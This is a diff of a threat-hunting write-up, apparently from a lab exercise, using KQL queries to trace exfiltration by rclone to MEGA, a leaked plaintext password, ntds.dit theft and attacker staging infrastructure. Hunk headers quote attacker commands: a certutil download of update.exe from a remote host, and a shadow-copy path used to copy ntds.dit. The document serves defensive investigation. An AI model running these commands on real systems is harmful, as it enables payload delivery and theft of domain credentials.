@@ -63,42 +63,38 @@ EmberForgeX_CL
 
 ---
 
-# 2. Exfiltration Tool Discovery - rclone.exe
+# 2. Exfiltration Destination – MEGA
 
 ## Investigation Task
 
 The objective was to determine:
-
-* what tool was used to exfiltrate the stolen data,
-* whether the tool was legitimate software,
-* and how the attacker transferred files externally.
+- where the stolen data was uploaded,
+- what cloud provider received the files,
+- and whether cloud-based exfiltration was used.
 
 ## What I Looked For
 
-* Cloud synchronization utilities
-* File transfer tools
-* External upload commands
-* Repeated tool execution attempts
-* Suspicious command-line arguments
-
----
+- Archive upload commands
+- Cloud synchronization activity
+- rclone destination parameters
+- External storage providers
+- Upload-related command lines
 
 ## Query Used
 
 ```kql
 EmberForgeX_CL
-| where CommandLine_s has "rclone"
+| where CommandLine_s has "gamedev.zip"
 | project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
 | order by TimeGenerated asc
-```
+
+| Artifact         | Value       |
+| ---------------- | ----------- |
+| Cloud Provider   | MEGA        |
+| Uploaded Archive | gamedev.zip |
 
 
-### Screenshot
-
-<img width="1021" height="321" alt="image" src="https://github.com/user-attachments/assets/beb5f25e-259b-4988-a9f5-179427c83c85" />
-
-
----
+<img width="1000" height="315" alt="image" src="https://github.com/user-attachments/assets/19e0639e-25cd-4f62-9d19-b3628e2e0aca" />
 
 # 3. Attacker Email Attribution - jwilson.vhr@proton.me
 
@@ -135,82 +131,7 @@ EmberForgeX_CL
 
 
 ---
-
-# 4. Plaintext Credential Exposure - Summer2024!
-
-
-## Investigation Task
-
-The objective was to determine whether:
-
-* credentials were exposed in plaintext,
-* command-line arguments leaked sensitive information,
-* and operational security mistakes could aid attribution.
-
-## What I Looked For
-
-* Password arguments
-* Authentication flags
-* Inline credentials
-* Failed execution attempts
-* Insecure command-line usage
-
-## Query Used
-
-```kql
-EmberForgeX_CL
-| where CommandLine_s has_any ("pass", "password", "mega-pass", "config create")
-| project TimeGenerated, Computer, CommandLine_s
-| order by TimeGenerated asc
-```
-
-### Screenshot
-
-<img width="845" height="258" alt="image" src="https://github.com/user-attachments/assets/0e5cd08f-969b-4e31-9074-091412a99f1c" />
-
-
----
-
-# 5. Exfiltration Destination IP - 66.203.125.15
-
-## Investigation Task
-
-The objective was to correlate:
-
-* the exfiltration process,
-* outbound network activity,
-* and the external IP address receiving stolen data.
-
-## What I Looked For
-
-* Sysmon network connection events
-* Event ID 3 telemetry
-* Process-to-network correlation
-* Outbound connections from rclone.exe
-* External destination IPs
-  
-## Query Used
-
-```kql
-EmberForgeX_CL
-| where EventCode_s == "3"
-| where Image_s has "rclone"
-| project TimeGenerated,
-          Computer,
-          Image_s,
-          DestinationIp_s,
-          DestinationPort_s
-| order by TimeGenerated asc
-```
-
-### Screenshot
-
-<img width="838" height="252" alt="image" src="https://github.com/user-attachments/assets/abe621f1-41d0-42a0-b0ee-056721819e33" />
-
-
----
-
-# 6. Active Directory Credential Database Theft - ntds.dit
+# 4. Active Directory Credential Database Theft - ntds.dit
 
 ## Investigation Task
 
@@ -254,7 +175,152 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Wi
 
 ---
 
-# 7. Staging Infrastructure Discovery - sync.cloud-endpoint.net
+# 5. Exfiltration Tool Discovery - rclone.exe
+
+## Investigation Task
+
+The objective was to determine:
+
+* what tool was used to exfiltrate the stolen data,
+* whether the tool was legitimate software,
+* and how the attacker transferred files externally.
+
+## What I Looked For
+
+* Cloud synchronization utilities
+* File transfer tools
+* External upload commands
+* Repeated tool execution attempts
+* Suspicious command-line arguments
+
+---
+
+## Query Used
+
+```kql
+EmberForgeX_CL
+| where CommandLine_s has "gamedev.zip"
+| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
+| order by TimeGenerated asc
+```
+
+
+### Screenshot
+
+<img width="1021" height="321" alt="image" src="https://github.com/user-attachments/assets/beb5f25e-259b-4988-a9f5-179427c83c85" />
+
+
+---
+
+# 6. Exfiltration Destination IP - 66.203.125.15
+
+## Investigation Task
+
+The objective was to correlate:
+
+* the exfiltration process,
+* outbound network activity,
+* and the external IP address receiving stolen data.
+
+## What I Looked For
+
+* Sysmon network connection events
+* Event ID 3 telemetry
+* Process-to-network correlation
+* Outbound connections from rclone.exe
+* External destination IPs
+  
+## Query Used
+
+```kql
+EmberForgeX_CL
+| where EventCode_s == "3"
+| where Image_s has "rclone"
+| project TimeGenerated,
+          Computer,
+          Image_s,
+          DestinationIp_s,
+          DestinationPort_s
+| order by TimeGenerated asc
+```
+
+### Screenshot
+
+<img width="838" height="252" alt="image" src="https://github.com/user-attachments/assets/abe621f1-41d0-42a0-b0ee-056721819e33" />
+
+
+---
+
+
+
+# 7. Plaintext Credential Exposure - Summer2024!
+
+
+## Investigation Task
+
+The objective was to determine whether:
+
+* credentials were exposed in plaintext,
+* command-line arguments leaked sensitive information,
+* and operational security mistakes could aid attribution.
+
+## What I Looked For
+
+* Password arguments
+* Authentication flags
+* Inline credentials
+* Failed execution attempts
+* Insecure command-line usage
+
+## Query Used
+
+```kql
+EmberForgeX_CL
+| where CommandLine_s has_any ("pass", "password", "mega-pass", "config create")
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
+```
+
+### Screenshot
+
+<img width="845" height="258" alt="image" src="https://github.com/user-attachments/assets/0e5cd08f-969b-4e31-9074-091412a99f1c" />
+
+
+---
+
+Q08 - Archive Method
+
+## Investigation Task
+
+The objective was to identify:
+- how the attacker compressed the stolen data,
+- whether built-in Windows functionality was used,
+- and whether Living Off The Land techniques were involved.
+
+## What I Looked For
+
+- Compression-related command lines
+- Archive creation activity
+- PowerShell compression cmdlets
+- ZIP archive generation
+- Native Windows utilities
+
+## Query Used
+
+```kql
+EmberForgeX_CL
+| where CommandLine_s has_any ("zip", "rar", "7z", "tar", "archive", "compress")
+| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
+| order by TimeGenerated asc
+
+The cmdlet is:
+
+Compress-Archive
+
+<img width="1005" height="336" alt="image" src="https://github.com/user-attachments/assets/6b339eff-f4b5-4ee8-b58c-eba398be3c03" />
+
+
+# 9. Staging Infrastructure Discovery - sync.cloud-endpoint.net
 
 ## Investigation Task
 
@@ -310,43 +376,6 @@ certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Pu
 
 
 ---
-
-# 8. DNS Infrastructure Correlation - sync.cloud-endpoint.net
-
-## Investigation Task
-
-The objective was to correlate:
-
-* suspicious DNS activity,
-* repeated external domains,
-* and infrastructure linked to attacker operations.
-
-## What I Looked For
-
-* Sysmon DNS query events
-* Event ID 22 telemetry
-* External domains
-* Repeated hostname lookups
-* Non-corporate infrastructure
-  
-## Query Used
-
-```kql
-EmberForgeX_CL
-| where EventCode_s == "22"
-| where QueryName_s !contains "emberforge.local"
-| summarize count() by QueryName_s
-| order by count_ desc
-```
-
-
-### Screenshot
-
-<img width="876" height="277" alt="image" src="https://github.com/user-attachments/assets/d6d59adf-1c0f-4ae6-8a41-1e5da923bd81" />
-
-
----
-
 
 # Attack Timeline
 
